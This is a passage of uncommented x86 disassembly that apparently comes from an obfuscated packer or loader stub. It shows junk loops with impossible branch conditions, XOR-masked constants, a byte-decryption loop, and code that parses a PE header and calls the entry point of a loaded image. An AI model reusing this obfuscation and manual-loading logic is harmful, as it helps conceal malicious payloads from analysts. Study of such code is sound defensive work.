  401fe8:	mov    DWORD PTR ds:0x42d014,edx
  401fee:	cmp    DWORD PTR ds:0x42d014,0x1e
  401ff5:	jae    0x402082
  401ffb:	cmp    DWORD PTR ds:0x42d014,0x20
  402002:	jne    0x402021
  402008:	push   0x42c008
  40200d:	push   DWORD PTR [ebp-0xc]
  402010:	push   0x42e000
  402015:	push   DWORD PTR [ebp-0x20]
  402018:	push   DWORD PTR [ebp-0x20]
  40201b:	call   DWORD PTR ds:0x42ec83
  402021:	jmp    0x401fe1
  402026:	and    DWORD PTR ds:0x42d008,0x0
  402030:	mov    ebx,DWORD PTR ds:0x42d008
  402036:	inc    ebx
  402037:	mov    DWORD PTR ds:0x42d008,ebx
  40203d:	cmp    DWORD PTR ds:0x42d008,0x6
  402044:	jne    0x402055
  40204a:	push   0x429000
  40204f:	call   DWORD PTR ds:0x42ec8b
  402055:	cmp    DWORD PTR ds:0x42d008,0x5
  40205c:	jne    0x40206f
  402062:	mov    ebx,DWORD PTR ds:0x42d008
  402068:	inc    ebx
  402069:	mov    DWORD PTR ds:0x42d008,ebx
  40206f:	cmp    DWORD PTR ds:0x42d008,0x11
  402076:	jb     0x402030
  40207c:	sbb    edx,0x8e9
  402082:	mov    edx,DWORD PTR ds:0x42e313
  402088:	mov    edx,DWORD PTR [edx+0x198]
  40208e:	xor    DWORD PTR ds:0x42a018,edx
  402094:	xor    eax,esi
  402096:	and    DWORD PTR ds:0x42c00c,0x0
  4020a0:	jmp    0x4020b2
  4020a5:	mov    ebx,DWORD PTR ds:0x42c00c
  4020ab:	inc    ebx
  4020ac:	mov    DWORD PTR ds:0x42c00c,ebx
  4020b2:	cmp    DWORD PTR ds:0x42c00c,0x1f
  4020b9:	jae    0x4020eb
  4020bf:	cmp    DWORD PTR ds:0x42c00c,0x21
  4020c6:	jne    0x4020e0
  4020cc:	push   DWORD PTR [ebp-0x18]
  4020cf:	push   DWORD PTR [ebp-0xc]
  4020d2:	push   0x42a000
  4020d7:	push   DWORD PTR [ebp-0x24]
  4020da:	call   DWORD PTR ds:0x42ec8f
  4020e0:	jmp    0x4020a5
  4020e5:	adc    ebx,DWORD PTR ds:0x429020
  4020eb:	add    eax,edi
  4020ed:	mov    ebx,DWORD PTR ds:0x42b004
  4020f3:	sbb    DWORD PTR ds:0x42a010,ebx
  4020f9:	mov    DWORD PTR [edx],eax
  4020fb:	and    DWORD PTR ds:0x429004,0x0
  402105:	mov    eax,ds:0x429004
  40210a:	inc    eax
  40210b:	mov    ds:0x429004,eax
  402110:	cmp    DWORD PTR ds:0x429004,0x27
  402117:	jne    0x402123
  40211d:	call   DWORD PTR ds:0x42ec93
  402123:	cmp    DWORD PTR ds:0x429004,0x1a
  40212a:	jb     0x402105
  402130:	mov    eax,DWORD PTR [ebp-0x8]
  402133:	add    ebx,0x5fb6
  402139:	xor    eax,esi
  40213b:	movzx  ebx,WORD PTR ds:0x42c008
  402142:	or     DWORD PTR ds:0x42c004,ebx
  402148:	add    eax,edi
  40214a:	adc    DWORD PTR ds:0x42c014,0x5b68
  402154:	mov    ds:0x42eaab,eax
  402159:	and    eax,DWORD PTR ds:0x42d008
  40215f:	mov    eax,ds:0x42e313
  402164:	mov    eax,DWORD PTR [eax+0x18c]
  40216a:	or     DWORD PTR ds:0x42b000,0x2b6e
  402174:	mov    eax,DWORD PTR [eax]
  402176:	mov    ebx,DWORD PTR ds:0x418f49
  40217c:	mov    ebx,DWORD PTR [ebx]
  40217e:	sbb    DWORD PTR ds:0x429018,ebx
  402184:	mov    DWORD PTR [ebp-0x7c],eax
  402187:	and    DWORD PTR ds:0x429020,0x0
  402191:	mov    eax,ds:0x429020
  402196:	inc    eax
  402197:	mov    ds:0x429020,eax
  40219c:	cmp    DWORD PTR ds:0x429020,0x24
  4021a3:	jne    0x4021cd
  4021a9:	push   0x6154
  4021ae:	push   0x429028
  4021b3:	push   0x8833
  4021b8:	push   0x2ef1
  4021bd:	push   0x2977
  4021c2:	push   0x6125
  4021c7:	call   DWORD PTR ds:0x42ec97
  4021cd:	cmp    DWORD PTR ds:0x429020,0x18
  4021d4:	jb     0x402191
  4021da:	mov    ebx,0xf89c85bd
  4021df:	neg    eax
  4021e1:	mov    DWORD PTR [ebp-0x10],ebx
  4021e4:	mov    DWORD PTR ds:0x429020,0x18
  4021ee:	cmp    DWORD PTR ds:0x429020,0x0
  4021f5:	je     0x402224
  4021fb:	cmp    DWORD PTR ds:0x429020,0x26
  402202:	jne    0x40220e
  402208:	call   DWORD PTR ds:0x42ec9b
  40220e:	mov    eax,ds:0x429020
  402213:	dec    eax
  402214:	mov    ds:0x429020,eax
  402219:	jmp    0x4021ee
  40221e:	or     DWORD PTR ds:0x42a004,ecx
  402224:	mov    DWORD PTR [ebp-0x10],ebx
  402227:	and    DWORD PTR ds:0x42b014,0x0
  402231:	jmp    0x402241
  402236:	mov    eax,ds:0x42b014
  40223b:	inc    eax
  40223c:	mov    ds:0x42b014,eax
  402241:	cmp    DWORD PTR ds:0x42b014,0x1c
  402248:	jae    0x402279
  40224e:	cmp    DWORD PTR ds:0x42b014,0x22
  402255:	jne    0x40226e
  40225b:	push   0x62db
  402260:	push   0x42b018
  402265:	push   DWORD PTR [ebp-0x20]
  402268:	call   DWORD PTR ds:0x42ec9f
  40226e:	jmp    0x402236
  402273:	sbb    eax,DWORD PTR ds:0x42b00c
  402279:	mov    DWORD PTR [ebp-0x10],ebx
  40227c:	movzx  eax,BYTE PTR ds:0x429000
  402283:	add    eax,DWORD PTR ds:0x42b01c
  402289:	mov    ds:0x429000,eax
  40228e:	mov    DWORD PTR [ebp-0x18],ecx
  402291:	xor    DWORD PTR ds:0x42901c,ecx
  402297:	mov    DWORD PTR [ebp-0x10],ebx
  40229a:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  4022a1:	and    DWORD PTR ds:0x42c018,0x0
  4022ab:	mov    eax,ds:0x42c018
  4022b0:	inc    eax
  4022b1:	mov    ds:0x42c018,eax
  4022b6:	cmp    DWORD PTR ds:0x42c018,0xe
  4022bd:	jne    0x4022d8
  4022c3:	push   0x42e0b3
  4022c8:	push   0x42e0f9
  4022cd:	push   0x400000
  4022d2:	call   DWORD PTR ds:0x42eca7
  4022d8:	cmp    DWORD PTR ds:0x42c018,0xd
  4022df:	jne    0x4022f0
  4022e5:	mov    eax,ds:0x42c018
  4022ea:	inc    eax
  4022eb:	mov    ds:0x42c018,eax
  4022f0:	cmp    DWORD PTR ds:0x42c018,0x18
  4022f7:	jb     0x4022ab
  4022fd:	and    DWORD PTR ds:0x42a008,0x0
  402307:	jmp    0x402317
  40230c:	mov    eax,ds:0x42a008
  402311:	inc    eax
  402312:	mov    ds:0x42a008,eax
  402317:	cmp    DWORD PTR ds:0x42a008,0x12
  40231e:	jae    0x402362
  402324:	cmp    DWORD PTR ds:0x42a008,0x4
  40232b:	jne    0x40233c
  402331:	push   0x42e0b3
  402336:	call   DWORD PTR ds:0x42ecab
  40233c:	cmp    DWORD PTR ds:0x42a008,0x3
  402343:	jne    0x402357
  402349:	xor    eax,eax
  40234b:	add    eax,DWORD PTR ds:0x42a008
  402351:	inc    eax
  402352:	mov    ds:0x42a008,eax
  402357:	jmp    0x40230c
  40235c:	sub    DWORD PTR ds:0x429010,ebx
  402362:	mov    eax,DWORD PTR [ebp-0x8]
  402365:	xor    eax,esi
  402367:	sub    DWORD PTR ds:0x42d004,0x3268
  402371:	add    eax,edi
  402373:	mov    DWORD PTR ds:0x42901c,0x7c76
  40237d:	jmp    0x40245e
  402382:	mov    eax,DWORD PTR [ebp-0xc]
  402385:	mov    ecx,DWORD PTR [ebp-0x1c]
  402388:	xor    eax,esi
  40238a:	and    DWORD PTR ds:0x42a01c,0x42c014
  402394:	lea    eax,[eax+ecx*1+0x3272e0]
  40239b:	push   eax
  40239c:	mov    eax,DWORD PTR [ebp-0x18]
  40239f:	or     DWORD PTR ds:0x42d008,0x79cb
  4023a9:	xor    eax,esi
  4023ab:	or     DWORD PTR ds:0x42b014,0x429004
  4023b5:	lea    eax,[ebp+eax*1+0x3272e8]
  4023bc:	push   eax
  4023bd:	mov    eax,ds:0x42e313
  4023c2:	add    DWORD PTR ds:0x42c010,0x2a0c
  4023cc:	push   DWORD PTR [eax+0x1bc]
  4023d2:	sub    DWORD PTR ds:0x429014,0x775c
  4023dc:	call   0x402bd1
  4023e1:	and    ecx,DWORD PTR ds:0x42b00c
  4023e7:	mov    eax,DWORD PTR [ebp-0xc]
  4023ea:	dec    DWORD PTR ds:0x42c00c
  4023f0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4023f3:	and    DWORD PTR ds:0x429014,0x0
  4023fd:	jmp    0x40240f
  402402:	mov    edx,DWORD PTR ds:0x429014
  402408:	inc    edx
  402409:	mov    DWORD PTR ds:0x429014,edx
  40240f:	cmp    DWORD PTR ds:0x429014,0x1e
  402416:	jae    0x402455
  40241c:	cmp    DWORD PTR ds:0x429014,0x6
  402423:	jne    0x402434
  402429:	push   0x42c010
  40242e:	call   DWORD PTR ds:0x42ecb3
  402434:	cmp    DWORD PTR ds:0x429014,0x5
  40243b:	jne    0x402450
  402441:	xor    edx,edx
  402443:	add    edx,DWORD PTR ds:0x429014
  402449:	inc    edx
  40244a:	mov    DWORD PTR ds:0x429014,edx
  402450:	jmp    0x402402
  402455:	xor    eax,esi
  402457:	lea    eax,[ecx+eax*1+0x3272e0]
  40245e:	sub    ecx,ecx
  402460:	mov    ecx,DWORD PTR [ebp-0xc]
  402463:	mov    edx,DWORD PTR [ebp-0xc]
  402466:	mov    DWORD PTR ds:0x42c014,0x77e
  402470:	xor    edx,esi
  402472:	add    DWORD PTR ds:0x42d014,0x42c014
  40247c:	xor    ecx,esi
  40247e:	add    ecx,edx
  402480:	sbb    DWORD PTR ds:0x42d000,0x43eb
  40248a:	mov    edx,DWORD PTR [ebp-0xc]
  40248d:	adc    DWORD PTR ds:0x42b01c,0x42c018
  402497:	xor    edx,esi
  402499:	lea    ecx,[ecx+edx*1+0x9758a0]
  4024a0:	mov    DWORD PTR ds:0x42b008,0xdf3
  4024aa:	mov    DWORD PTR [ebp-0x1c],eax
  4024ad:	cmp    eax,ecx
  4024af:	jbe    0x402382
  4024b5:	mov    eax,DWORD PTR [ebp+0xc]
  4024b8:	mov    ds:0x42e197,eax
  4024bd:	mov    eax,DWORD PTR [ebp+0x10]
  4024c0:	mov    DWORD PTR ds:0x42d010,0x1c
  4024ca:	cmp    DWORD PTR ds:0x42d010,0x0
  4024d1:	je     0x402527
  4024d7:	cmp    DWORD PTR ds:0x42d010,0xf
  4024de:	jne    0x4024f9
  4024e4:	push   0x42900c
  4024e9:	push   0x42900c
  4024ee:	push   0x429018
  4024f3:	call   DWORD PTR ds:0x42ec73
  4024f9:	cmp    DWORD PTR ds:0x42d010,0x10
  402500:	jne    0x402513
  402506:	mov    ecx,DWORD PTR ds:0x42d010
  40250c:	dec    ecx
  40250d:	mov    DWORD PTR ds:0x42d010,ecx
  402513:	xor    ecx,ecx
  402515:	or     ecx,DWORD PTR ds:0x42d010
  40251b:	dec    ecx
  40251c:	mov    DWORD PTR ds:0x42d010,ecx
  402522:	jmp    0x4024ca
  402527:	mov    ds:0x42e3eb,eax
  40252c:	mov    eax,ds:0x42e197
  402531:	mov    ecx,DWORD PTR [ebp-0x2c]
  402534:	sub    eax,edi
  402536:	xor    eax,esi
  402538:	mov    DWORD PTR [ecx],eax
  40253a:	mov    eax,DWORD PTR [ebp-0x34]
  40253d:	cmp    eax,0xf89c85b9
  402542:	jne    0x40261f
  402548:	lea    eax,[ebp-0x48]
  40254b:	mov    DWORD PTR [ebp-0x9c],eax
  402551:	lea    eax,[ebp+0x4]
  402554:	mov    DWORD PTR [ebp-0x48],eax
  402557:	mov    eax,DWORD PTR [ebp-0x48]
  40255a:	test   eax,eax
  40255c:	je     0x402ba1
  402562:	mov    eax,DWORD PTR [ebp-0x24]
  402565:	mov    eax,DWORD PTR [ebp-0xc]
  402568:	mov    eax,DWORD PTR [ebp-0x8]
  40256b:	mov    DWORD PTR [ebp+0xc],eax
  40256e:	mov    eax,eax
  402570:	mov    eax,ds:0x42e313
  402575:	mov    eax,DWORD PTR [eax+0x1c8]
  40257b:	mov    eax,DWORD PTR [eax]
  40257d:	cdq    
  40257e:	mov    ebx,eax
  402580:	mov    eax,0xfabdbee9
  402585:	add    ebx,eax
  402587:	adc    edx,0xffffffff
  40258a:	and    DWORD PTR [ebp-0x10],0x0
  40258e:	xor    edx,0x0
  402591:	mov    DWORD PTR [ebp-0x6c],edx
  402594:	mov    edx,DWORD PTR [ebp+0xc]
  402597:	mov    DWORD PTR [ebp-0x14],edx
  40259a:	mov    ecx,0x8a29a12b
  40259f:	xor    ebx,ecx
  4025a1:	add    DWORD PTR [ebp-0x14],eax
  4025a4:	mov    edx,DWORD PTR [ebp-0x14]
  4025a7:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4025ab:	xor    edx,ecx
  4025ad:	mov    DWORD PTR [ebp-0x58],edx
  4025b0:	mov    edx,DWORD PTR [ebp-0x10]
  4025b3:	xor    edx,0x0
  4025b6:	mov    DWORD PTR [ebp-0x54],edx
  4025b9:	cmp    DWORD PTR [ebp-0x58],ebx
  4025bc:	jne    0x4025ce
  4025c2:	mov    edx,DWORD PTR [ebp-0x6c]
  4025c5:	cmp    DWORD PTR [ebp-0x54],edx
  4025c8:	je     0x4025fd
  4025ce:	mov    edx,DWORD PTR ds:0x42e313
  4025d4:	mov    edx,DWORD PTR [edx+0x1c0]
  4025da:	mov    edx,DWORD PTR [edx]
  4025dc:	xor    ebx,ebx
  4025de:	add    edx,eax
  4025e0:	adc    ebx,0xffffffff
  4025e3:	xor    edx,ecx
  4025e5:	xor    ebx,0x0
  4025e8:	cmp    edx,0x70941fc1
  4025ee:	jne    0x402ba1
  4025f4:	cmp    ebx,0xffffffff
  4025f7:	jne    0x402ba1
  4025fd:	mov    edx,DWORD PTR ds:0x42e38f
  402603:	mov    ebx,DWORD PTR ds:0x42e397
  402609:	xor    edx,ebx
  40260b:	mov    DWORD PTR ds:0x42e38f,edx
  402611:	mov    ebx,DWORD PTR ds:0x42e38f
  402617:	mov    edx,DWORD PTR [ebp-0x48]
  40261a:	jmp    0x402b60
  40261f:	mov    eax,DWORD PTR [ebp-0x3c]
  402622:	cmp    eax,0xf89c85b8
  402627:	je     0x402684
  40262d:	mov    eax,DWORD PTR [ebp-0x8]
  402630:	mov    ecx,DWORD PTR [ebp-0x38]
  402633:	xor    eax,esi
  402635:	add    eax,edi
  402637:	cmp    eax,ecx
  402639:	je     0x402684
  40263f:	mov    eax,ds:0x42e313
  402644:	mov    eax,DWORD PTR [eax+0x194]
  40264a:	mov    ecx,DWORD PTR [eax]
  40264c:	mov    eax,DWORD PTR [ecx+0x3c]
  40264f:	push   DWORD PTR ds:0x42e3eb
  402655:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  402659:	push   DWORD PTR ds:0x42e197
  40265f:	add    eax,ecx
  402661:	mov    ecx,DWORD PTR ds:0x42e313
  402667:	mov    ecx,DWORD PTR [ecx+0x194]
  40266d:	push   DWORD PTR [ecx]
  40266f:	call   eax
  402671:	mov    ecx,DWORD PTR ds:0x42e313
  402677:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40267d:	mov    DWORD PTR [ecx],eax
  40267f:	jmp    0x402ba1
  402684:	mov    eax,DWORD PTR [ebp-0x8]
  402687:	mov    ecx,DWORD PTR [ebp-0x7c]
  40268a:	xor    eax,esi
  40268c:	add    eax,edi
  40268e:	cmp    eax,ecx
  402690:	jne    0x402a61
  402696:	mov    eax,DWORD PTR [ebp-0x8]
  402699:	mov    ecx,DWORD PTR ds:0x42e313
  40269f:	mov    ecx,DWORD PTR [ecx+0x198]
  4026a5:	xor    eax,esi
  4026a7:	add    eax,edi
  4026a9:	cmp    eax,DWORD PTR [ecx]
  4026ab:	jne    0x4026ca
  4026b1:	mov    eax,DWORD PTR [ebp-0x8]
  4026b4:	push   0xf89c85b9
  4026b9:	xor    eax,esi
  4026bb:	add    eax,edi
  4026bd:	push   eax
  4026be:	push   ebx
  4026bf:	push   DWORD PTR [ebp-0xc]
  4026c2:	push   DWORD PTR [ebp-0x8]
  4026c5:	call   0x40c7f6
  4026ca:	mov    eax,DWORD PTR [ebp-0xc]
  4026cd:	mov    DWORD PTR [ebp-0x40],eax
  4026d0:	mov    eax,DWORD PTR [ebp-0x8]
  4026d3:	mov    DWORD PTR [ebp-0x1c],eax
  4026d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4026d9:	xor    eax,esi
  4026db:	add    eax,edi
  4026dd:	mov    DWORD PTR [ebp+0x10],eax
  4026e0:	mov    eax,ds:0x42e193
  4026e5:	mov    eax,DWORD PTR [eax]
  4026e7:	mov    DWORD PTR [ebp+0x10],eax
  4026ea:	mov    eax,ds:0x42e39b
  4026ef:	mov    eax,DWORD PTR [eax]
  4026f1:	mov    DWORD PTR [ebp-0x18],eax
  4026f4:	mov    DWORD PTR [ebp+0xc],0xf89c87b9
  4026fb:	mov    eax,DWORD PTR [ebp+0xc]
  4026fe:	xor    eax,esi
  402700:	add    eax,edi
  402702:	mov    DWORD PTR [ebp+0xc],eax
  402705:	mov    eax,ds:0x42e313
  40270a:	mov    DWORD PTR [ebp+0xc],eax
  40270d:	mov    eax,DWORD PTR [ebp+0x10]
  402710:	mov    DWORD PTR [ebp+0xc],eax
  402713:	mov    eax,DWORD PTR [ebp+0xc]
  402716:	push   0x4
  402718:	pop    ecx
  402719:	sub    ecx,eax
  40271b:	add    ecx,DWORD PTR [ebp-0x18]
  40271e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f9
  402725:	mov    DWORD PTR [ebp+0x10],ecx
  402728:	mov    DWORD PTR [ebp-0xe4],ebx
  40272e:	mov    eax,DWORD PTR [ebp+0xc]
  402731:	mov    DWORD PTR [ebp-0xe0],eax
  402737:	mov    eax,DWORD PTR [ebp+0x10]
  40273a:	mov    DWORD PTR [ebp-0xdc],eax
  402740:	mov    eax,DWORD PTR [ebp-0x2c]
  402743:	xor    eax,esi
  402745:	add    eax,edi
  402747:	mov    DWORD PTR [ebp-0xd8],eax
  40274d:	lea    eax,[ebp-0x88]
  402753:	mov    DWORD PTR [ebp-0xd4],eax
  402759:	mov    eax,DWORD PTR [ebp-0xe4]
  40275f:	xor    eax,esi
  402761:	add    eax,edi
  402763:	mov    DWORD PTR [ebp-0xe4],eax
  402769:	lea    eax,[ebp-0xe4]
  40276f:	push   eax
  402770:	mov    eax,DWORD PTR [ebp-0x40]
  402773:	xor    eax,esi
  402775:	add    eax,edi
  402777:	push   eax
  402778:	mov    eax,ds:0x42e333
  40277d:	push   0x42e289
  402782:	push   DWORD PTR [eax]
  402784:	call   0x405286
  402789:	mov    eax,DWORD PTR [ebp+0xc]
  40278c:	mov    ecx,DWORD PTR [ebp+0x10]
  40278f:	mov    DWORD PTR [ebp-0x84],ecx
  402795:	mov    ecx,DWORD PTR [ebp-0x1c]
  402798:	xor    ecx,esi
  40279a:	mov    DWORD PTR [ebp-0x18],eax
  40279d:	add    ecx,edi
  40279f:	jmp    0x402a02
  4027a4:	lea    edx,[ecx+eax*1]
  4027a7:	mov    DWORD PTR [ebp+0x10],edx
  4027aa:	mov    edx,DWORD PTR [ebp-0x84]
  4027b0:	sub    edx,ecx
  4027b2:	mov    DWORD PTR [ebp+0xc],edx
  4027b5:	mov    edx,DWORD PTR [ebp+0xc]
  4027b8:	mov    DWORD PTR [ebp-0x4c],edx
  4027bb:	mov    edx,DWORD PTR [ebp+0x10]
  4027be:	mov    DWORD PTR [ebp-0x50],0xf89c85b9
  4027c5:	mov    DWORD PTR [ebp-0x6c],edx
  4027c8:	mov    DWORD PTR [ebp-0x20],0xf89c85b8
  4027cf:	mov    edx,DWORD PTR [ebp-0x50]
  4027d2:	xor    edx,esi
  4027d4:	add    edx,edi
  4027d6:	mov    DWORD PTR [ebp+0x10],edx
  4027d9:	mov    edx,DWORD PTR [ebp-0x50]
  4027dc:	xor    edx,esi
  4027de:	add    edx,edi
  4027e0:	mov    DWORD PTR [ebp+0xc],edx
  4027e3:	mov    DWORD PTR [ebp-0x68],0xf89c85d9
  4027ea:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  4027f1:	mov    edx,DWORD PTR [ebp-0x50]
  4027f4:	mov    ebx,DWORD PTR [ebp-0x4c]
  4027f7:	xor    edx,esi
  4027f9:	add    edx,edi
  4027fb:	cmp    ebx,edx
  4027fd:	je     0x4029f6
  402803:	mov    eax,DWORD PTR [ebp-0x20]
  402806:	xor    eax,esi
  402808:	mov    edx,0xffcd8d20
  40280d:	sub    edx,eax
  40280f:	add    edx,DWORD PTR [ebp-0x4c]
  402812:	mov    eax,DWORD PTR [ebp-0x20]
  402815:	mov    ebx,DWORD PTR [ebp+0x10]
  402818:	xor    eax,esi
  40281a:	add    eax,edi
  40281c:	imul   eax,ebx
  40281f:	cmp    eax,edx
  402821:	ja     0x4029f3
  402827:	mov    edx,DWORD PTR [ebp+0x10]
  40282a:	mov    eax,DWORD PTR [ebp-0x4c]
  40282d:	mov    ebx,DWORD PTR [ebp-0x68]
  402830:	sub    eax,edx
  402832:	xor    ebx,esi
  402834:	xor    edx,edx
  402836:	add    ebx,edi
  402838:	div    ebx
  40283a:	mov    DWORD PTR [ebp+0xc],eax
  40283d:	mov    eax,DWORD PTR [ebp-0x74]
  402840:	mov    edx,DWORD PTR [ebp+0xc]
  402843:	xor    eax,esi
  402845:	add    eax,edi
  402847:	cmp    edx,eax
  402849:	jbe    0x402859
  40284f:	mov    eax,DWORD PTR [ebp-0x74]
  402852:	xor    eax,esi
  402854:	add    eax,edi
  402856:	mov    DWORD PTR [ebp+0xc],eax
  402859:	mov    eax,DWORD PTR [ebp-0x68]
  40285c:	mov    edx,DWORD PTR [ebp+0xc]
  40285f:	xor    eax,esi
  402861:	add    eax,edi
  402863:	imul   eax,edx
  402866:	mov    DWORD PTR [ebp+0xc],eax
  402869:	mov    eax,DWORD PTR [ebp-0x50]
  40286c:	mov    edx,DWORD PTR [ebp+0xc]
  40286f:	xor    eax,esi
  402871:	add    eax,edi
  402873:	cmp    edx,eax
  402875:	je     0x4029dc
  40287b:	mov    eax,DWORD PTR [ebp+0xc]
  40287e:	mov    DWORD PTR [ebp-0x34],eax
  402881:	mov    eax,DWORD PTR [ebp+0x10]
  402884:	add    eax,DWORD PTR [ebp-0x6c]
  402887:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  40288e:	mov    DWORD PTR [ebp-0x30],eax
  402891:	mov    eax,0xf89c85b8
  402896:	mov    DWORD PTR [ebp-0x5c],eax
  402899:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4028a0:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4028a7:	mov    DWORD PTR [ebp-0x28],eax
  4028aa:	mov    eax,DWORD PTR [ebp-0x2c]
  4028ad:	xor    eax,esi
  4028af:	add    eax,edi
  4028b1:	jmp    0x402998
  4028b6:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  4028bd:	mov    DWORD PTR [ebp-0x80],0xf89c85ad
  4028c4:	mov    eax,DWORD PTR [ebp-0x28]
  4028c7:	mov    edx,DWORD PTR [ebp+0xc]
  4028ca:	xor    eax,esi
  4028cc:	add    eax,edi
  4028ce:	imul   eax,edx
  4028d1:	mov    edx,DWORD PTR [ebp-0x30]
  4028d4:	mov    al,BYTE PTR [eax+edx*1]
  4028d7:	mov    BYTE PTR [ebp-0x1],al
  4028da:	mov    eax,DWORD PTR [ebp-0x28]
  4028dd:	mov    edx,DWORD PTR [ebp+0xc]
  4028e0:	xor    eax,esi
  4028e2:	add    eax,edi
  4028e4:	imul   eax,edx
  4028e7:	mov    edx,DWORD PTR [ebp-0x54]
  4028ea:	xor    edx,esi
  4028ec:	add    eax,edx
  4028ee:	mov    edx,DWORD PTR [ebp-0x30]
  4028f1:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e0]
  4028f9:	mov    edx,DWORD PTR [ebp-0x78]
  4028fc:	xor    edx,esi
  4028fe:	lea    eax,[edx+eax*1+0x3272e0]
  402905:	movzx  edx,BYTE PTR [ebp-0x1]
  402909:	xor    edx,eax
  40290b:	mov    BYTE PTR [ebp-0x1],dl
  40290e:	mov    al,BYTE PTR [ebp-0x1]
  402911:	mov    edx,DWORD PTR [ebp-0x28]
  402914:	mov    ebx,DWORD PTR [ebp+0xc]
  402917:	xor    edx,esi
  402919:	add    edx,edi
  40291b:	imul   edx,ebx
  40291e:	mov    ebx,DWORD PTR [ebp-0x30]
  402921:	mov    BYTE PTR [edx+ebx*1],al
  402924:	mov    eax,DWORD PTR [ebp-0x28]
  402927:	mov    edx,DWORD PTR [ebp+0xc]
  40292a:	xor    eax,esi
  40292c:	add    eax,edi
  40292e:	imul   eax,edx
  402931:	mov    edx,DWORD PTR [ebp-0x30]
  402934:	mov    al,BYTE PTR [eax+edx*1]
  402937:	mov    BYTE PTR [ebp-0x1],al
  40293a:	mov    eax,DWORD PTR [ebp-0x28]
  40293d:	mov    edx,DWORD PTR [ebp+0xc]
  402940:	xor    eax,esi
  402942:	add    eax,edi
  402944:	imul   eax,edx
  402947:	mov    edx,DWORD PTR [ebp-0x5c]
  40294a:	xor    edx,esi
  40294c:	add    eax,edx
  40294e:	mov    edx,DWORD PTR [ebp-0x30]
  402951:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e0]
  402959:	mov    edx,DWORD PTR [ebp-0x80]
  40295c:	xor    edx,esi
  40295e:	lea    eax,[edx+eax*1+0x3272e0]
  402965:	movzx  edx,BYTE PTR [ebp-0x1]
  402969:	xor    edx,eax
  40296b:	mov    BYTE PTR [ebp-0x1],dl
  40296e:	mov    al,BYTE PTR [ebp-0x1]
  402971:	mov    edx,DWORD PTR [ebp-0x28]
  402974:	mov    ebx,DWORD PTR [ebp+0xc]
  402977:	xor    edx,esi
  402979:	add    edx,edi
  40297b:	imul   edx,ebx
  40297e:	mov    ebx,DWORD PTR [ebp-0x30]
  402981:	mov    BYTE PTR [edx+ebx*1],al
  402984:	mov    eax,DWORD PTR [ebp-0x10]
  402987:	mov    edx,DWORD PTR [ebp-0x5c]
  40298a:	xor    eax,esi
  40298c:	xor    edx,esi
  40298e:	add    eax,edi
  402990:	add    edx,edi
  402992:	imul   eax,edx
  402995:	add    eax,DWORD PTR [ebp+0xc]
  402998:	mov    DWORD PTR [ebp+0xc],eax
  40299b:	mov    eax,DWORD PTR [ebp+0xc]
  40299e:	mov    edx,DWORD PTR [ebp-0x34]
  4029a1:	cmp    edx,eax
  4029a3:	jb     0x4028b6
  4029a9:	mov    eax,DWORD PTR [ebp-0x5c]
  4029ac:	mov    edx,DWORD PTR [ebp-0x34]
  4029af:	xor    eax,esi
  4029b1:	add    eax,edi
  4029b3:	imul   eax,edx
  4029b6:	mov    edx,DWORD PTR [ebp-0x2c]
  4029b9:	xor    edx,esi
  4029bb:	add    edx,edi
  4029bd:	or     eax,edx
  4029bf:	mov    edx,DWORD PTR [ebp-0x20]
  4029c2:	xor    edx,esi
  4029c4:	add    eax,edx
  4029c6:	mov    edx,DWORD PTR [ebp-0x20]
  4029c9:	xor    edx,esi
  4029cb:	add    eax,edx
  4029cd:	mov    edx,DWORD PTR [ebp+0x10]
  4029d0:	lea    eax,[eax+edx*1+0x64e5c0]
  4029d7:	jmp    0x4029eb
  4029dc:	mov    eax,DWORD PTR [ebp-0x20]
  4029df:	mov    edx,DWORD PTR [ebp+0x10]
  4029e2:	xor    eax,esi
  4029e4:	lea    eax,[eax+edx*1+0x3272e0]
  4029eb:	mov    DWORD PTR [ebp+0x10],eax
  4029ee:	jmp    0x402803
  4029f3:	mov    eax,DWORD PTR [ebp-0x18]
  4029f6:	mov    edx,DWORD PTR [ebp-0x40]
  4029f9:	xor    edx,esi
  4029fb:	lea    ecx,[ecx+edx*1+0x3272e0]
  402a02:	lea    edx,[ecx-0x3272e0]
  402a08:	xor    edx,esi
  402a0a:	cmp    edx,0xf89c95b9
  402a10:	jne    0x4027a4
  402a16:	mov    ecx,DWORD PTR [ebp-0x1c]
  402a19:	mov    edx,DWORD PTR [ebp-0x40]
  402a1c:	mov    ebx,DWORD PTR [ebp-0x1c]
  402a1f:	xor    edx,esi
  402a21:	mov    dl,BYTE PTR [edx+eax*1+0x3272e0]
  402a28:	xor    ecx,esi
  402a2a:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e0]
  402a31:	xor    ebx,esi
  402a33:	mov    BYTE PTR [ebx+eax*1+0x3272e0],dl
  402a3a:	mov    edx,DWORD PTR [ebp-0x40]
  402a3d:	xor    edx,esi
  402a3f:	mov    BYTE PTR [edx+eax*1+0x3272e0],cl
  402a46:	mov    eax,DWORD PTR [ebp-0x40]
  402a49:	mov    eax,DWORD PTR [ebp-0x8]
  402a4c:	xor    eax,esi
  402a4e:	add    eax,edi
  402a50:	mov    ds:0x42e397,eax
  402a55:	mov    eax,DWORD PTR [ebp-0x8]
  402a58:	xor    eax,esi
  402a5a:	add    eax,edi
  402a5c:	mov    ds:0x42e38f,eax
  402a61:	lea    eax,[ebp-0x44]
  402a64:	mov    DWORD PTR [ebp-0x90],eax
  402a6a:	lea    eax,[ebp+0x4]
  402a6d:	mov    DWORD PTR [ebp-0x44],eax
  402a70:	mov    eax,DWORD PTR [ebp-0x44]
  402a73:	test   eax,eax
  402a75:	je     0x402ba1
  402a7b:	mov    DWORD PTR [ebp-0xa0],0xf152c30
  402a85:	mov    DWORD PTR [ebp-0x98],0x712ed0f
  402a8f:	mov    DWORD PTR [ebp-0x8c],0x373fc21
  402a99:	mov    DWORD PTR [ebp-0x94],0x72670a11
